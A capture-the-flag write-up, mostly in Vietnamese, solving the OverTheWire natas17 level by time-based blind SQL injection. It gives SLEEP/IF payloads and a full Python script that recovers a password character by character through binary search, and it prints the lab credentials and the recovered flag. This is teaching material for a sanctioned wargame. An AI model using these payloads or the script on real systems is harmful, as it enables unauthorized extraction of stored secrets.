## 🕵️‍♂️ Challenge:
Username: natas17  
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC  
URL: http://natas17.natas.labs.overthewire.org  

<img width="800" src="https://github.com/user-attachments/assets/e519e4f6-e63d-4f0f-822a-a65485ebc6b8" />

Source code:  

<img width="800" src="https://github.com/user-attachments/assets/e6dfa819-103a-4801-a147-a1cf1fc0ca0a" />


## 📝 Solution: 



Ứng dụng bị lỗi SQL Injection vì dữ liệu người dùng được nối trực tiếp vào câu truy vấn SQL:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

Vì kết quả truy vấn không được hiển thị ra trang, nên đây là dạng **blind SQL injection**.  

Có thể bật `debug` để xem câu query được tạo ra:

```text
?username=natas18&debug=1
```

<img width="953" height="333" alt="image" src="https://github.com/user-attachments/assets/b2919818-c578-4aec-94df-16b0122a3ca6" />

Khi chèn thêm một dấu `"`:

```text
?username=natas18"&debug=1
```

query sẽ thành:

```sql
SELECT * from users where username="natas18""
```

<img width="930" height="310" alt="image" src="https://github.com/user-attachments/assets/d927409a-3711-4460-bfa3-2333a5e81d29" />

Điều này cho thấy dữ liệu đầu vào được chèn thẳng vào câu lệnh SQL.  

Do trang không hiển thị kết quả đúng hoặc sai, có thể dùng hàm `SLEEP()` để đo thời gian phản hồi.

Ví dụ payload:

```text
?username=natas18"%20AND%20SLEEP(5)%23
```

Nếu trang phản hồi chậm khoảng 5 giây, có thể kết luận rằng payload SQL đã được thực thi thành công.  

Có thể tạo điều kiện đúng thì delay, sai thì phản hồi ngay bằng `IF()`:

```text
?username=natas18"%20AND%20IF(LENGTH(password)=32,SLEEP(5),0)%23
```

Nếu phản hồi chậm, suy ra mật khẩu có độ dài là `32`.  

Sau đó, từng ký tự của mật khẩu được suy ra bằng biểu thức:  

```sql
ASCII(SUBSTRING(password,pos,1)) > x
```

Kết hợp với **binary search** trên tập ký tự:  

```text
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

có thể dò toàn bộ mật khẩu một cách hiệu quả hơn so với brute-force từng ký tự.  

Script:
```python
import time, requests

URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

SLEEP = 2
THRESHOLD = 1.8
TIMEOUT = 10
LENGTH = 32
PREFIX = ""

s = requests.Session()
s.auth = AUTH

def ok(cond):
    t = time.perf_counter()
    s.get(URL, params={"username": f'natas18" AND IF({cond},SLEEP({SLEEP}),0)#'}, timeout=TIMEOUT)
    return time.perf_counter() - t > THRESHOLD

def get_char(pos):
    l, r = 0, len(CHARS) - 1
    while l < r:
        m = (l + r) // 2
        if ok(f"ASCII(SUBSTRING(password,{pos},1))>{ord(CHARS[m])}"):
            l = m + 1
        else:
            r = m
    return CHARS[l]

pwd = PREFIX
for i in range(len(pwd) + 1, LENGTH + 1):
    pwd += get_char(i)
    print(f"[{i:02d}/{LENGTH}] {pwd}")

print("\nPassword:", pwd)
```


<img width="578" height="689" alt="image" src="https://github.com/user-attachments/assets/3175d2a2-6771-4ea2-abcf-0ad8d467a5eb" />


>### 🎯 Password: ***6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ***
